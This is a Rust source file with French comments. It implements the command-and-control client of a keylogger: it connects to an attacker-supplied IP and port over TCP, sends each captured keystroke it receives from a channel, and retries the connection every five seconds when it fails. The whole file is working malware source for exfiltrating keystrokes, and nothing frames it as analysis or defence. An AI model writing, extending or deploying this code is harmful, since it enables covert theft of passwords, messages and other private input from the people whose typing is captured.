use std::io::{Write};
use std::net::TcpStream;
use std::sync::mpsc::{Receiver};
use std::thread;
use std::time::Duration;

/// Lance la connexion vers le C2 et envoie les frappes reçues.
pub fn start_c2_client(rx: Receiver<String>, ip: &str, port: u16) {
    let addr = format!("{}:{}", ip, port);

    loop {
        match TcpStream::connect(&addr) {
            Ok(mut stream) => {
                println!("[+] Connecté au C2 à {}", addr);

                while let Ok(keystroke) = rx.recv() {
                    if let Err(e) = stream.write_all(keystroke.as_bytes()) {
                        eprintln!("Erreur envoi: {:?}", e);
                        break;
                    }
                }
            }
            Err(e) => {
                eprintln!("[-] Connexion C2 échouée : {:?}. Retry...", e);
                thread::sleep(Duration::from_secs(5));
            }
        }
    }
}
